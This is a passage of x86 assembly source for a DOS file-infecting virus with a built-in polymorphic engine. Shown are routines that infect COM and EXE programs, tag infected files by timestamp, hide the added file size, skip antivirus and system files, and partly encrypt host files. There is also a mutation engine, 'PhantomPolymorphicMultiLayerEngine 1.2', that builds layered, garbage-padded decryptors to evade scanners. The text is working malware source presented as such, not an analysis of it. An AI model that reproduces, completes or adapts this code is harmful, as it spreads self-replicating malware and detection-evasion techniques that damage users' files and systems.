            jmp     sub_head_siz
   no_relocatio:
            cmp     word ptr [filesize+02h],00h
            je      no_relocati     ; Equal? Jump to no_relocati
   no_calc_relo:
            mov     ax,0ffffh       ; Set offset of first relocation e...

            jmp     sub_head_siz
   crypt_com:
            mov     [header_size_],00h  ; Set header size to zero
            mov     [header_size],1ah   ; Set header size to twenty-six
   no_relocati:
            mov     ax,word ptr [filesize]
   sub_head_siz:
            sub     ax,[header_size]    ; Subtract header size from addres...
            jbe     crypt_exit      ; Below or equal? Jump to crypt_exit

            mov     cx,ax       ; CX = offset of first relocation ...
            cmp     ax,57cfh        ; Offset of first relocation entr...?
            jb      rnd_in_range    ; Below? Jump to rnd_in_range

            mov     ax, 57cfh       ; Random number within twenty-two ...
   rnd_in_range:
            call    get_random_limit
            cmp     ax,00h      ; Zero?
            je      crypt_exit      ; Equal? Jump to crypt_exit
            mov     [crypt_length],ax   ; Store length of encrypted/decryp...

            sub     cx,ax       ; Subtract random number within ra...
            xchg    ax,cx       ; AX = offset within first relocat...
            call    get_random_limit
            add     ax,[header_size]    ; Add header size to random number...
            mov     [crypt_ptr],ax  ; Store file pointer to encrypted/...

            mov     ax,0feh         ; Random number within two hundred...
            call    get_random_limit
            inc     ax          ; Increase 8-bit random number
            mov     [crypt_key],al  ; Store encryption/decryption key

            mov     ah,3fh      ; Read from file
            call    disk_action
            jc      crypt_exit      ; Error? Jump to crypt_error

            mov     di,dx       ; DI = offset of data_buffer
            call    encrypt_host

            mov     ah,40h      ; Write to file
            call    disk_action
            jc      crypt_exit      ; Error? Jump to crypt_error

            mov     [encrypt_stat],01h  ; Host encrypted
   crypt_exit:
            pop     ax          ; Load AX from stack

            ret             ; Return
            endp

   disk_action  proc    near        ; Read/write encrypted data
            push    ax          ; Save AX at stack
            mov     ax,4200h        ; Set current file position (SOF)
            xor     cx,cx       ; CX:DX = offset from origin of ne...
            mov     dx,[crypt_ptr]  ; DX = file pointer to encrypted/d...
            int     21h
            pop     ax          ; Load AX from stack

            mov     cx,[crypt_length]   ; CX = length of encrypted/decrypt...
            lea     dx,data_buffer  ; DX = offset of data_buffer
            int     21h

            ret             ; Return
            endp

   encrypt_host proc    near        ; Partial decrypt the infected file
            mov     al,[crypt_key]  ; AL = encryption/decryption key
            mov     cx,[crypt_length]   ; CX = length of encrypted/decrypt...
   encrypt_loop:
            mov     ah,[di]         ; AH = byte of infected file
            xor     [di],al         ; Encrypt byte of infected file

            add     al,ah       ; Add byte of infected file to enc...
            add     al,cl       ; Add low-order byte of length of ...

            inc     di          ; Increase index register

            loop    encrypt_loop

            ret             ; Return
            endp

   decrypt_host proc    near        ; Partial decrypt the infected file
            mov     al,[si+crypt_key]   ; AL = encryption/decryption key
            mov     cx,[si+crypt_length]
   decrypt_loop:
            xor     es:[di],al      ; Decrypt byte of infected file

            add     al,es:[di]      ; Add byte of infected file to dec...
            add     al,cl       ; Add low-order byte of length of ...

            inc     di          ; Increase index register

            loop    decrypt_loop

            ret             ; Return
            endp

   examine_file proc    near        ; Examine filename and file extension
            push    ax si       ; Save registers at stack
            mov     si,dx       ; SI = offset of filename
            cld             ; Clear direction flag
   find_dot:
            lodsb           ; AL = byte of filename
            and     al,al       ; End of filename?
            jz      tst_nam_exi     ; Zero? Jump to tst_nam_exi
            cmp     al,'.'      ; Dot?
            jne     find_dot        ; Not equal? Jump to find_dot

            mov     ax,[si-04h]     ; AX = two bytes of filename
            and     ax,1101111111011111b
            cmp     ax,'SE'         ; Aidstest?
            je      tst_nam_exi     ; Equal? Jump to tst_nam_exi
            cmp     ax,'NA'         ; COMMAND.COM?
            je      tst_nam_exi     ; Equal? Jump to tst_nam_exi

            cmp     ax,'SD'         ; CHKDSK.EXE?
            jne     tst_file_ext    ; Not equal? Jump to tst_file_ext

            mov     cs:[chkdsk_stat],01h
   tst_file_ext:
            lodsw           ; AX = two bytes of file extension
            and     ax,1101111111011111b
            cmp     ax,'OC'         ; COM executable?
            jne     test_exe        ; Not equal? Jump to test_exe

            lodsb           ; AL = byte of file extension
            and     al,11011111b    ; Upcase character
            cmp     al,'M'      ; COM executable?

            jmp     tst_nam_exit
   test_exe:
            cmp     ax,'XE'         ; EXE executable?
            jne     tst_nam_exit    ; Not equal? Jump to tst_nam_exit

            lodsb           ; AL = byte of file extension
            and     al,11011111b    ; Upcase character
            cmp     al,'E'      ; EXE executable?
   tst_nam_exit:
            pop     si ax       ; Load registers from stack

            ret             ; Return
   tst_nam_exi:
            inc     al          ; Clear zero flag

            jmp     tst_nam_exit
            endp

   tst_infected proc    near        ; Test if a file is infected
            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00000001b    ; Infected (2 seconds)?

            stc             ; Set carry flag

            je      is_infected     ; Equal? Jump to is_infected

            clc             ; Clear carry flag
   is_infected:
            ret             ; Return
            endp

   size_stealth proc    near        ; Filesize stealth
            push    ax          ; Save AX at stack
            push    bx cx dx ds si  ; Save registers at stack
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     bx,[filenam_addr]   ; BX = offset of filename
            xor     si,si       ; Zero SI
            mov     cx,(08h/02h)    ; Store eight bytes
   sto_nam_loop:
            mov     ax,es:[bx+si]   ; AX = two bytes of filename
            mov     word ptr [si+filename],ax

            inc     si          ; SI = offset within filename
            inc     si          ; SI =   "  "   "

            loop    sto_nam_loop

            cmp     [dta_fcb_stat],00h  ; DTA stealth?
            je      sto_file_ext    ; Equal? Jump to sto_file_ext

            mov     byte ptr [si+filename],'.'
            inc     si          ; SI = offset of file extension

            dec     bx          ; BX =   "    "   "       "
   sto_file_ext:
            mov     cx,(04h/02h)    ; Store four bytes
   sto_ext_loop:
            mov     ax,es:[bx+si]   ; AX = two bytes of file extension
            mov     word ptr [si+filename],ax

            inc     si          ; SI = offset within file extension
            inc     si          ; SI =   "  "     "       "

            loop    sto_ext_loop

            mov     byte ptr cs:[filename+0ch],00h

            mov     [filesize_],00h     ; Zero filesize_
            lea     dx,filename     ; DX = offset of filename
            call    examine_file
            jnz     sub_filesize    ; No error? Jump to sub_filesize

            mov     ax,3d00h        ; Open file (read)
            call    int21_call
            jc      sub_filesize    ; Error? Jump to sub_filesize
            xchg    ax,bx       ; BX = file handle

            xor     cx,cx       ; CX:DX = offset from origin of ne...
            mov     dx,cx       ;   "   "   "     "     "    "    "
            mov     ax,4202h        ; Set current file position (EOF)
            call    int21_call

            xchg    dx,cx       ; CX:DX = offset from origin of ne...
            xchg    ax,dx       ;   "   "   "     "     "    "    "
            dec     dx          ;   "   "   "     "     "    "    "
            dec     dx          ;   "   "   "     "     "    "    "
            mov     ax,4200h        ; Set current file position (SOF)
            call    int21_call

            mov     cx,02h      ; Read two bytes
            lea     dx,filesize_    ; DX = offset of filesize_
            mov     ah,3fh      ; Read from file
            call    int21_call

            mov     ah,3eh      ; Close file
            call    int21_call
   sub_filesize:
            pop     si ds dx cx bx  ; Load registers from stack

            mov     ax,cs:[filesize_]   ; AX = filesize_

            sub     es:[bx],ax      ; Subtract size of virus from file...
            sbb     word ptr es:[bx+02h],00h
            jnb     size_st_exit    ; No error? Jump to size_st_exit

            add     es:[bx],ax      ; Add size of virus from filesize
            adc     word ptr es:[bx+02h],00h
   size_st_exit:
            pop     ax          ; Load AX from stack

            ret             ; Return
            endp

   lod_file_inf proc    near        ; Load file information
            push    dx          ; Save DX at stack
            mov     si,dx       ; SI = offset of filename
            mov     ax,121ah        ; Get file's drive
            int     2fh

            mov     dl,al       ; DL = drive number
            mov     ah,36h      ; Get free disk space
            int     21h

            xchg    ax,bx       ; AX = number of free clusters, BX...
            xor     dx,dx       ; Zero DX
            mul     bx          ; DX:AX = free space on drive in b...
            mul     cx          ;   "   "  "     "   "    "   "   "

            or      dx,dx       ; Enough free space on drive in b...?
            jnz     enough_free     ; Not zero? Jump to enough_free

            cmp     ax,2000h        ; Enough free space on drive in b...?
   enough_free:
            pop     dx          ; Load DX from stack
            jae     get_file_att    ; Above or equal? Jump to get_file_att
   lod_fil_exit:
            stc             ; Set carry flag

            ret             ; Return
   get_file_att:
            mov     ax,4300h        ; Get file attributes
            int     21h
            jc      lod_fil_exit    ; Error? Jump to lod_fil_exit

            test    cl,00011100b    ; System, volume label or directory?
            jnz     lod_fil_exit    ; Not zero? Jump to lod_fil_exit

            mov     cs:[file_attr],cx   ; Store new file attributes

            xor     cx,cx       ; CX = new file attributes
            mov     ax,4301h        ; Set file attributes
            int     21h
            jc      lod_fil_exit    ; Error? Jump to lod_fil_exit

            mov     ax,3d02h        ; Open file (read/write)
            int     21h
            xchg    ax,bx       ; BX = file handle
            jc      lod_fil_exit    ; Error? Jump to lod_fil_exit

            push    dx          ; Save DX at stack
            mov     ax,5700h        ; Get file's date and time
            int     21h
            mov     cs:[file_date],dx   ; Store file's date
            mov     cs:[file_time],cx   ; Store file's time

            clc             ; Clear carry flag
            pop     dx          ; Load DX from stack

            ret             ; Return
            endp

   sto_file_inf proc    near        ; Store file information
            push    dx          ; Save DX at stack
            mov     ax,5701h        ; Set file's date and time
            mov     cx,cs:[file_time]   ; CX = new time
            mov     dx,cs:[file_date]   ; DX = new date
            int     21h

            mov     ah,3eh      ; Close file
            int     21h
            pop     dx          ; Load DX from stack

            mov     ax,4301h        ; Set file attributes
            mov     cx,cs:[file_attr]   ; CX = new file attributes
            int     21h

            ret             ; Return
            endp

   prepare_exe  proc    near        ; Prepare EXE infection
            push    si          ; Save SI at stack
            push    ax dx       ; Save registers at stack
            mov     cx,200h         ; Divide by pages
            div     cx          ; DX:AX = filesize in pages
            inc     ax          ; Increase total number of 512-pag...
            cmp     ax,word ptr [file_header_+04h]
            jne     internal_ove    ; Internal overlay? Jump to intern...
            cmp     dx,word ptr [file_header_+02h]
   internal_ove:
            pop     dx ax       ; Load registers from stack
            jne     pre_exe_exit    ; Internal overlay? Jump to pre_ex...

            mov     si,word ptr [file_header_+08h]
            mov     cl,04       ; Multiply by paragraphs
            shl     si,cl       ; SI = header size
            sub     ax,si       ; Subtract header size from filesize
            sbb     dx,00h      ; DX:AX = filesize - header size
            mov     cx,10h      ; Divide by paragraphs
            div     cx          ; DX:AX = initial CS:IP releative ...
            mov     word ptr [file_header_+14h],dx
            mov     word ptr [file_header_+16h],ax

            mov     word ptr [file_header_+0eh],ax
            mov     word ptr [file_header_+10h],6bb3h
            mov     ax,dx       ; AX = decryptor's offset
            pop     si          ; Load SI from stack

            clc             ; Clear carry flag

            ret             ; Return
   pre_exe_exit:
            pop     si          ; Load SI from stack
   pre_com_exit:
            stc             ; Set carry flag

            ret             ; Return
            endp

   prepare_com  proc    near        ; Prepare COM infection
            cmp     ax,0a831h       ; Filesize too large?
            ja      pre_com_exit    ; Above? Jump to pre_com_exit

            push    ax          ; Save AX at stack

            mov     [file_header_],11101001b
            sub     ax,03h      ; AX = offset of virus within infe...
            mov     [virus_offset],ax   ; Store offset of virus within inf...
            pop     ax          ; Load AX from stack
            add     ax,100h         ; AX = decryptor's offset

            clc             ; Clear carry flag

            ret             ; Return
            endp

   infect_exe   proc    near        ; Infect EXE executable
            mov     ax,word ptr [filesize]
            mov     dx,word ptr [filesize+02h]
            add     ax,[poly_total_lenght]
            adc     dx,00h      ; DX:AX = filesize + length of dec...
            mov     cx,200h         ; Divide by pages
            div     cx          ; DX:AX = filesize in pages
            inc     ax          ; Increase total number of 512-pag...
            mov     word ptr [file_header_+02h],dx
            mov     word ptr [file_header_+04h],ax

   infect_com   proc    near        ; Infect COM executable
            mov     ax,4200h        ; Set current file position (SOF)
            call    set_file_pos

            mov     ah,40h      ; Write to file
            mov     cx,1ah      ; Write twenty-six bytes
            lea     dx,file_header_     ; DX = offset of file_header_
            int     21h

            clc             ; Clear carry flag

            ret             ; Return
            endp
            endp

            db      '"PhantomPolymorphicMultiLayerEngine 1.2"'

   ;   table interpretation
   ;  each entry is composed by an information byte and some data bytes. the
   ; information bytes contains the number of data bytes the entry has and
   ; the type of instruction. it is based on the data in the lower nibble
   ; using this scheme:
   ;
   ; ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ value ³ data bytes  ³    subroutine called to generate this instruction   ³
   ; ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³   0   ³  1  ³      routines_various_memoff_or_rr              ³
   ; ³   1   ³  1  ³      routines_copy_one_plus_imm             ³
   ; ³   2   ³  2  ³      routines_math_with_immediate           ³
   ; ³   3   ³  2  ³      routines_manage_math_twobytes              ³
   ; ³   4   ³  1  ³      routines_one_byte_16reg                ³
   ; ³   5   ³  1  ³      routines_copy_one_byte                 ³
   ; ³   6   ³  2  ³      routines_copy_one_word                 ³
   ; ³   7   ³   high nib  ³      routines_copy_many_bytes               ³
   ; ³   8   ³  1  ³      routines_manage_jumps                  ³
   ; ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;  if the value of the low nibble is not 7 (in which case the high nibble
   ; contains the lenght of the data bytes) in the high nibble a comptability
   ; number is stored. this number is used when the garbage to be generated has
   ; to be from a certain fixed set and is used by the get_instr_with_compat
   ; routine. in that case only the table entries that has a high nibble that has
   ; some specific bits triggered will be considered as possible garbage
   ; entries candidates. (ie. compat of 0fh mean nothing is changed)
   ;

   i_table_start:
           db  40h ;
           db  10h ; adc reg,reg or from mem

           db  41h ;
           db  14h ; adc reg,imm (ax/al only)

           db  42h ;
           db  80h ; adc reg,imm
           db  10h ;

           db  60h ;
           db    0 ; adc reg,reg or from mem

           db  61h ;
           db    4 ; add reg,imm (ax/al only)

           db  62h ;
           db  80h ; add reg,imm
           db    0 ;

           db  60h ;
           db  20h ; and reg,reg or from mem

           db  61h ;
           db  24h ; and reg,imm (ax/al only)

           db  62h ;
           db  80h ; and reg,imm
           db  20h ;

           db  95h ;
           clc

           db  95h ;
           cld

           db  95h ;
           cli

           db  95h ;
           cmc

           db  90h ;
           db  38h ; cmp reg,reg or from mem

           db  91h ;
           db  3Ch ; cmp reg,imm (ax/al only)

           db  92h ;
           db  80h ; cmp reg,imm
           db  38h ;

           db  24h ;
           db  48h ; dec register 16 bit

           db  63h ;
           db 0FEh ; dec register
           db    8 ; used for reg

           db  27h ;
           in  al,61h

           db  44h ;
           db  40h ; inc register 16 bit

           db    3 ;
           db 0FEh ; inc register
           db    0 ; used for reg

           db  47h
           mov ah, 30h
           int 21h     ; DOS - GET DOS VERSION

           db  47h
           mov ah, 2Ah
           int 21h     ; DOS - GET CURRENT DATE

           db  47h
           mov ah, 2Ch
           int 21h     ; DOS - GET CURRENT TIME

           db  47h
           mov ah, 19h
           int 21h     ; DOS - GET DEFAULT DISK NUMBER

           db  67h
           push    es
           mov ah, 35h
           int 21h     ; DOS - GET INTERRUPT VECTOR
           pop es


           db  77h
           mov ah, 48h
           mov bx, 0FFFFh
           int 21h     ; DOS - ALLOCATE MEMORY

           db     8 ;
           db   77h ; ja

           db     8 ;
           db   73h ; jnb

           db     8 ;
           db   72h ; jb

           db     8 ;
           db   76h ; jbe

           db     8 ;
           db  0E3h ; jcxz

           db     8 ;
           db   74h ; je

           db     8 ;
           db   7Fh ; jg

           db     8 ;
           db   7Dh ; jnl

           db     8 ;
           db   7Ch ; jl

           db     8 ;
           db   7Eh ; jle

           db     8 ;
           db  0EBh ; jmp

           db     8 ;
           db   75h ; jne

           db     8 ;
           db   71h ; jno

           db     8 ;
           db   7Bh ; jnp

           db     8 ;
           db   79h ; jns

           db     8 ;
           db   70h ; jo

           db     8 ;
           db   7Ah ; jp

           db     8 ;
           db   78h ; js

           db  0D7h ;
           sub ax, ax
           push    es
           push    ax
           pop es
           les bx, es:[4Ch]    ; get int13h vector
           mov ax, es
           pop es


           db  0d7h
           push    es
           xor ax, ax
           mov es, ax
           les bx, es:[84h]    ; get int21h vector
           mov dx, es
           pop es

           db  0a7h
           mov cx, 20h
   grb_const_loop_5:
           shr ax, 1
           rcl ax, 1
           dec cx
           jnz grb_const_loop_5


           db  0b7h
           mov cx,10h
           mov bx, 0Ah
   grb_const_loop_4:
           mul bx
           dec cx
           jnz grb_const_loop_4


           db 0E0h ;
           db  88h ; mov reg,reg or from mem

           db 0E2h ;
           db 0C6h ; mov reg,imm
           db    0 ;

           db  63h ;
           db 0F6h ; neg register
           db  18h ; used for register

           db 0F5h ;
           nop

           db  63h ;
           db 0F6h ; not register
           db  10h ; used for register

           db  60h ;
           db    8 ; or reg,reg or from mem

           db  61h ;
           db  0Ch ; or reg,imm (ax/al only)

           db  62h ;
           db  80h ; or reg,imm
           db    8 ;

           db  27h ;
           push    ax
           pop dx

           db  27h ;
           push    dx
           pop cx

           db  27h ;
           push    bx
           pop ax

           db  27h ;
           rep lodsb

           db  27h ;
           repnz   scasb

           db  27h ;
           rep scasw

           db  17h ;
           lodsw

           db 0A7h ;
           cld
   grb_const_loop:
           lodsb
           xor bx,ax
           cmp si,1234h
           jne grb_const_loop

           db  67h ;
   grb_const_loop_2:
           add dl,cs:[bx]
           dec bx
           jne grb_const_loop_2

           db  97h ;
   grb_const_loop_3:

           xor [bx],cl
           xor [bx],cl
           jmp grb_const_nijmp
   grb_const_nijmp:
           dec cx
           jne grb_const_loop_3

           db  67h ;
           xchg    bx,ax
           xchg    bx,cx
           xchg    cx,ax
           xchg    cx,bx

           db  47h ;
           xchg    si,di
           xchg    di,si

           db  27h ;
           push    si
           pop di

           db  47h ;
           call    grb_const_nicall
   grb_const_nicall:
           pop si

           db    3 ;
           db 0D0h ; rcl register
           db  10h ; used for register

           db    3 ;
           db 0D0h ; rcr register
           db  18h ; used for register

           db  63h ;
           db 0D0h ; rol register
           db    0 ; used for register

           db  63h ;
           db 0D0h ; ror register
           db    8 ; used for register

           db  63h ;
           db 0D0h ; shl register
           db  20h ; used for register

           db    3 ;
           db 0D0h ; sar register
           db  38h ; used for register

           db  63h ;
           db 0D0h ; shr register
           db  28h ; used for register

           db  95h ;
           stc

           db  17h ;
           sti

           db  15h ;
           std

           db 0F6h
           xchg    bx,bx

           db 0F6h ;
           xchg    cx,cx

           db 0F6h ;
           xchg    dx,dx

           db 0F6h ;
           xchg    di,di

           db 0F6h ;
           xchg    si,si

           db  60h ;
           db  28h ; sub reg,reg or from mem

           db  61h ;
           db  2Ch ; sub reg,imm (ax/al only)

           db  62h ;
           db  80h ; sub reg,imm
           db  28h ;

           db    1 ;
           db 0A8h ; test reg,imm (ax/al only)

           db    2 ;
           db 0F6h ; test reg,imm
           db    0 ;

           db  60h ;
           db  30h ; xor reg,reg or from mem

           db  61h ;
           db  34h ; xor reg,imm (ax/al only)

           db  32h ;
           db  80h ; xor reg,imm
           db  30h ;

           db 0FFh     ; marker for end of table
   i_table_end:
   rnd_init_seed:
           push    si
           xor si,si
           call    rda_get_datetime
           pop si
           ret

   get_random_limit:
           push    si
           xor si,si
           call    random_value_with_modulus
           pop si
           ret

   get_random_0_or_1:
           mov ax, 1
           call    get_random_limit
           ret


   ; PPMLE entry point
   ;  calling registers:
   ;   CX = lenght to encrypt
   ;   SI = running offset
   ;   DI = where to put generated code
   ;   BX =

   ppmle_gen:
           mov ax, 8           ; how many encryption layers
           call    get_random_limit    ; (RDA layer not included)
           mov ds:[poly_layer_nr], al
           mov ds:[poly_actual_layer], 0
           mov ds:[poly_reg_cx], cx    ; store some regs and then
           mov ds:[poly_reg_si], si    ; call the poly routine
           mov ds:[poly_reg_bx], bx
           mov ds:[poly_reg_di], di
           call    generate_poly
           mov dx, ds:[poly_reg_di]
           mov ax, ds:[poly_total_lenght]
           mov cx, ax
           ret             ; back from poly

   ;  return registers:
   ;   CX = lenght of generated code
   ;   DX = pointer on generated code


   generate_poly:
           mov ax, ds:[poly_actual_layer]
           cmp al, ds:[poly_layer_nr]
           jb  poly_generate_layer

           mov ds:[end_most_internal_layer], di
           call    rda_and_body_encrypt
           ret             ; back to lower layer activation

   poly_generate_layer:
           sub sp, 40h             ; stack space needed
                               ; as temp storage
           mov ds:[layer_sp_pointer], sp
           mov ds:[layer_di_pointer], di

           call    poly_init_stage1        ; init all regs to some
                               ; value and put quite
                               ; some garbage
           mov ax, 0Fh
           call    get_random_limit         ; how many math ops
           inc ax               ; on memory will be
           mov ds:[howmany_from_used_table], ax ; created

           mov ax, 7               ; get initialization
           call    get_random_limit        ; type
           mov ds:[tipo_register], ax
           mov word ptr ds:[counter_direction], 0
           cmp ax, 4               ; 1/2 prob
           jl  dontmodifydirection
           mov word ptr ds:[counter_direction], 1

   dontmodifydirection:
           call    get_random_0_or_1
           mov ds:[pointer_direction], al

   select_the_pointer_reg:
           mov ax, 3
           call    get_random_limit
           mov bx, ax
           mov al, [bx + offset possible_pointers]
           cmp byte ptr ds:[pointer_direction], 0
           jnz ok_pointer_sel_d
           cmp al, 5           ; bp
           jz  select_the_pointer_reg

   ok_pointer_sel_d:
           mov ds:[pointer_register], al

   resel_cnt_regg:
           mov ax, 7
           call    get_random_limit
           cmp al, ds:[pointer_register]
           jz  resel_cnt_regg
           cmp al, 4           ; no stack pointer
           jz  resel_cnt_regg
           mov ds:[counter_register], al
           cmp al, 0           ; using ax
           jnz grb_rest_notneeded
           mov byte ptr ds:[restrict_grb_ax_is_used], 1

   grb_rest_notneeded:
           call    register_assign_init
           mov cx, ds:[howmany_from_used_table]
           xor si, si

   fill_stack_for_genmath:
           mov ax, 0Ah
           call    get_random_limit        ; fill on the stack
           mov bp, ds:[layer_sp_pointer]   ; with random vals
           mov [bp+si], al         ; for next subrout
           inc si              ; use
           loop    fill_stack_for_genmath


           mov byte ptr ds:[create_or_just_read], 0
           mov word ptr ds:[pointer_to_used_table], offset mom_table
           call    generate_math_on_mem_ops

           mov byte ptr ds:[register_compat + 1], 0EFh
           mov cl, ds:[pointer_register]
           mov al, 1
           shl al, cl
           not al
           and ds:[register_compat + 1], al    ; can do everything
                               ; xcept pointer reg

           cmp byte ptr ds:[pointer_register], 3 ; bx?
           jnz lower_can_use_also_bx
           mov al, 77h             ; can use all lower
           and ds:[register_compat], al    ; xcept bh/bl

   lower_can_use_also_bx:
           mov ax, 0Fh
           call    get_random_limit
           inc ax
           mov cx, ax

   dec_loop_internal_garbage:
           mov ax, 7
           call    get_random_limit    ; select a register
           mov ds:[garbage_register], al
           cmp word ptr ds:[garbage_word_byte], 1
           jnz check_regz_when_by

           cmp al, 4               ; no sp
           jz  dec_loop_internal_garbage

           cmp al, ds:[pointer_register]   ; no pointer
           jz  dec_loop_internal_garbage

           cmp al, ds:[counter_register]   ; no counter
           jz  dec_loop_internal_garbage
           jmp short dec_loop_int_grb_ok

   check_regz_when_by:
           and al, 3               ; is byte size
           cmp al, ds:[counter_register]   ; no counter
           jz  dec_loop_internal_garbage
           cmp byte ptr ds:[pointer_register], 3  ; if not bx then ok
           jnz dec_loop_int_grb_ok        ; anyway other just
                                  ; 16bit access
           cmp al, ds:[pointer_register]   ; no pointer
           jz  dec_loop_internal_garbage

   dec_loop_int_grb_ok:
           push    cx
           mov ax, 6
           call    get_instr_with_compat
           call    call_generator
           pop cx
           loop    dec_loop_internal_garbage

           call    exitloop_condition_gen      ; put the check for
                               ; decryptor end and
                               ; jump back
           mov di, ds:[dec_loop_end_pos]   ; put a ret opcode
           mov al, 0C3h            ; just at the decryptor
           stosb                   ; ends

           mov ds:[decryptor_ended_inmem_pnt], di
           push    word ptr ds:[layer_sp_pointer]
           push    word ptr ds:[decryptor_ended_inmem_pnt]
           push    word ptr ds:[layer_di_pointer]
           push    word ptr ds:[howmany_from_used_table]
           push    word ptr ds:[tipo_register]
           push    word ptr ds:[counter_direction]
           push    word ptr ds:[pointer_assign_pos]
           push    word ptr ds:[counter_assign_pos]
           push    word ptr ds:[counter_check_pos]
           push    word ptr ds:[dec_loop_begin_pos]
           push    word ptr ds:[dec_loop_end_pos]
           mov al, ds:[pointer_register]
           push    ax
           mov al, ds:[pointer_direction]
           push    ax

           inc word ptr ds:[poly_actual_layer]
           call    generate_poly           ; recursive layer gen

           pop ax
           mov ds:[pointer_direction], al
           pop ax
           mov ds:[pointer_register], al
           pop word ptr ds:[dec_loop_end_pos]
           pop word ptr ds:[dec_loop_begin_pos]
           pop word ptr ds:[counter_check_pos]
           pop word ptr ds:[counter_assign_pos]
           pop word ptr ds:[pointer_assign_pos]
           pop word ptr ds:[counter_direction]
           pop word ptr ds:[tipo_register]
           pop word ptr ds:[howmany_from_used_table]
           pop word ptr ds:[layer_di_pointer]
           pop word ptr ds:[decryptor_ended_inmem_pnt]
           pop word ptr ds:[layer_sp_pointer]
           mov ax, ds:[pnt_to_end_after_rda]
           mov ds:[pointer_to_end_after_rda_2], ax

           call    correct_pnt_addr_vals
           call    word ptr ds:[layer_di_pointer]  ; execute layer

           mov si, ds:[decryptor_ended_inmem_pnt]
           mov di, si
           dec di              ; copy everything one
           mov cx, ds:[poly_total_lenght]  ; byte lower so we
           cld                 ; delete the ret
           repe movsb

           dec word ptr ds:[pnt_to_end_after_rda]
           mov di, ds:[howmany_from_used_table]
           mov si, 0
           dec di

   mom_copy_from_stack_tm:
           mov bp, ds:[layer_sp_pointer]   ; copy all the math
           mov al, [bp+di]         ; ops from stack zone
           mov [si+offset mops_tmptable], al   ; to mem storage
           dec di
           inc si
           cmp si, ds:[howmany_from_used_table]
           jnz mom_copy_from_stack_tm

           mov si, offset mops_tmptable    ; from
           lea di, [bp+0]          ; to stack zone
           mov cx, ds:[howmany_from_used_table]
   reverse_mom_copy:
           lodsb
           mov ss:[di], al         ; so copy the math ops
           inc di              ; on mem in reverse
           loop    reverse_mom_copy        ; order on stack

           mov di, ds:[howmany_from_used_table]
           mov si, 0
           dec di
   mom_copy_from_stack_tm_2:
           mov al, [bp+di+30h]         ; and now copy the
           mov [si+offset mops_tmptable], al   ; registers pairs from
           dec di              ; stack to temp mem
           inc si
           cmp si, ds:[howmany_from_used_table]
           jnz mom_copy_from_stack_tm_2

           mov si, offset mops_tmptable
           lea di, [bp+30h]
           mov cx, ds:[howmany_from_used_table]
   reverse_mom_copy_2:
           lodsb                   ; and now just put them
           mov ss:[di], al         ; in rev order again
           inc di              ; on the stack
           loop    reverse_mom_copy_2

           mov byte ptr ds:[create_or_just_read], 1
           mov ds:[pointer_to_used_table], offset mom_table_inv
           mov di, ds:[dec_loop_begin_pos]
           call    generate_math_on_mem_ops    ; everything ready on
                               ; stack, so just create
                               ; the dec instructions
           mov ax, ds:[poly_actual_layer]
           sub ax, ds:[poly_reg_bx]
           add ax, ds:[poly_reg_di]
           sub ds:[decryptor_ended_inmem_pnt], ax
           mov ax, ds:[decryptor_ended_inmem_pnt]
           add ax, ds:[poly_total_lenght]
           dec ax
           mov ds:[pointer_to_end_after_rda_2], ax
           call    correct_pnt_addr_vals       ; now correct inits
                               ; for "normal" exec
           mov ax, ds:[dec_loop_end_pos]   ; last calculations
           sub ax, ds:[layer_di_pointer]   ; on lenght
           add ds:[poly_total_lenght], ax
           dec word ptr ds:[poly_actual_layer]
           add sp, 40h         ; correct stack
           ret             ; layer finished


   ;        ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

   ; this is the rda engine
   rda_and_body_encrypt:
           mov di, ds:[end_most_internal_layer]
           push    di
           mov cx, 4       ; how many entries from table
           mov si, 0

   ; gets 4 random entries from the first table. each entry is 4 bytes long
   ; and will be used as a base for the RDA generation later.
   fill_first_part_rda:
           mov ax, 7
           call    get_random_limit
           shl ax, 1       ; each entry in table is 4 bytes
           shl ax, 1
           mov bx, ax
           mov ax, [bx+offset rda_from_table_part_1]
           mov [si+offset rda_to_part_1], ax
           mov ax, [bx+offset rda_from_table_part_1 + 2]
           mov [si+offset rda_to_part_1 + 2], ax
           add si, 4       ; next destination
           loop    fill_first_part_rda


   ; gets 16 random entries from the second table. each entry is 2 bytes long.
   ; aswell as the entry the loop stores also, on the opposite side of the
   ; table, the coordinated second entry (other 2 bytes) that actually does
   ; the exact inverse operation.
           mov cx, 10h     ; how many entries from table
           mov si, 0

   fill_second_part_rda:
           mov ax, 0Ah     ; 10 possible
           call    get_random_limit
           shl ax, 1
           mov bx, ax
           mov ax, [bx+offset rda_from_table_part_2] ; 2nd tbl
           mov [si+offset rda_to_part_2], ax
           neg bx              ; get the contra

   tbl2_len equ (offset rda_from_table_part_2_end - offset rda_from_table_part_2)

           add bx,((tbl2_len-04h)/02h)
           nop
           mov ax, [bx+(offset rda_from_table_part_2 + tbl2_len/2)]
           push    si
           neg si
           add si, (40h/2 - 2)             ; from end
           mov [si+offset rda_to_part_2 + 20h], ax ; half table
           pop si
           add si, 2
           loop    fill_second_part_rda

   ; now the basic rda code will be copied in place with some garbage inserted.
   ; please check the comments at the rda_steps_table and the loop below for some
   ; hints on how it works.
           mov si, offset rda_basic_body   ; to basic rda body
           lea bx, rda_steps_table     ; to steps
           mov cx, 0C4h            ; nr of steps

   rda_add     equ (offset rda_address_buffer - offset rda_basic_body)
   ; must equ 1df3h

